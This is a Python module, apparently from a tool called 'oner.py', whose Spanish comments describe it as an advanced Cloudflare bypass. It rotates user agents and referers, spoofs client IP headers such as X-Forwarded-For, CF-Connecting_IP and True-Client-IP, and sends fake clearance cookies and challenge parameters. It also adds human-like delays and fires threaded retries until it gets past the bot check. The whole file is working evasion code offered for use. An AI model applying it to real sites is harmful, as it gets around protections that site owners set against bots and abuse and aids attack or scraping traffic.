import random
import time
import requests
import threading

CLOUDFLARE_BYPASS_UAS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15",
    "Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1"
]

CLOUDFLARE_BYPASS_COOKIES = [
    {"__cf_bm": "dummyvalue1"},
    {"cf_clearance": "dummyvalue2"},
    {}
]

CLOUDFLARE_BYPASS_PARAMS = [
    "?__cf_chl_jschl_tk__=dummy",
    "?cf_chl_prog=true",
    ""
]

CLOUDFLARE_BYPASS_REFERERS = [
    "https://google.com", "https://bing.com", "https://yahoo.com", "https://duckduckgo.com", "https://github.com"
]

CLOUDFLARE_BYPASS_EXTRA_HEADERS = [
    {"X-Requested-With": "XMLHttpRequest"},
    {"X-Forwarded-Proto": "https"},
    {"X-Original-URL": "/"},
    {"X-Forwarded-Host": "127.0.0.1"},
    {}
]

def get_cf_bypass_headers():
    """
    Devuelve un diccionario de cabeceras para intentar evadir Cloudflare.
    """
    spoof_ip = f"127.0.0.{random.randint(2,254)}"
    headers = {
        "User-Agent": random.choice(CLOUDFLARE_BYPASS_UAS),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Referer": random.choice(CLOUDFLARE_BYPASS_REFERERS),
        "X-Forwarded-For": spoof_ip,
        "X-Real-IP": spoof_ip,
        "CF-Connecting_IP": spoof_ip,
        "True-Client-IP": spoof_ip,
        "Cache-Control": "no-cache",
        "Pragma": "no-cache",
        "Upgrade-Insecure-Requests": "1",
        "DNT": "1",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-User": "?1"
    }
    extra = random.choice(CLOUDFLARE_BYPASS_EXTRA_HEADERS)
    headers.update(extra)
    # Headers HTTP2/3
    headers["Alt-Used"] = "1.1.1.1"
    headers["TE"] = "Trailers"
    return headers

def cloudflare_bypass_sleep():
    """
    Simula espera para saltar challenge de JS de Cloudflare.
    """
    time.sleep(random.uniform(4.5, 6.5))
    # Simula comportamiento humano
    if random.random() > 0.7:
        time.sleep(random.uniform(1.5, 2.5))

def advanced_cf_bypass(session, url, max_attempts=5, threads=2, **kwargs):
    """
    Realiza múltiples intentos concurrentes con diferentes combinaciones de headers, cookies y parámetros para evadir Cloudflare.
    """
    results = []
    result_lock = threading.Lock()
    success = threading.Event()

    def attempt_bypass():
        if success.is_set():
            return
        headers = get_cf_bypass_headers()
        if "headers" in kwargs:
            headers.update(kwargs["headers"])
        cookies = random.choice(CLOUDFLARE_BYPASS_COOKIES)
        param = random.choice(CLOUDFLARE_BYPASS_PARAMS)
        full_url = url + param if param and not url.endswith(param) else url
        cloudflare_bypass_sleep()
        try:
            resp = session.get(full_url, headers=headers, cookies=cookies, timeout=12, **kwargs)
            with result_lock:
                results.append(resp)
            # Si Cloudflare fue evadido (no challenge, status 200 y sin challenge JS)
            if resp.status_code == 200 and "cf-chl-bypass" not in resp.headers and "Attention Required!" not in resp.text and "cf-browser-verification" not in resp.text:
                success.set()
        except requests.RequestException:
            pass

    threads_list = []
    for _ in range(max_attempts):
        if success.is_set():
            break
        t = threading.Thread(target=attempt_bypass)
        threads_list.append(t)
        t.start()
        if len(threads_list) >= threads:
            for th in threads_list:
                th.join()
            threads_list = []
    for th in threads_list:
        th.join()
    # Devuelve el primero exitoso o el último intento
    for r in results:
        if r.status_code == 200 and "cf-chl-bypass" not in r.headers and "Attention Required!" not in r.text and "cf-browser-verification" not in r.text:
            return r
    return results[-1] if results else None

def print_cf_bypass_example():
    """
    Ejemplo de uso del bypass avanzado a Cloudflare.
    """
    import requests
    session = requests.Session()
    url = "http://localhost:0000"
    resp = advanced_cf_bypass(session, url)
    if resp and resp.status_code == 200:
        print("[oner.py] Bypass Cloudflare exitoso, contenido recibido.")
    elif resp:
        print(f"[oner.py] Código de estado: {resp.status_code}")
    else:
        print("[oner.py] No se pudo evadir Cloudflare tras varios intentos.")
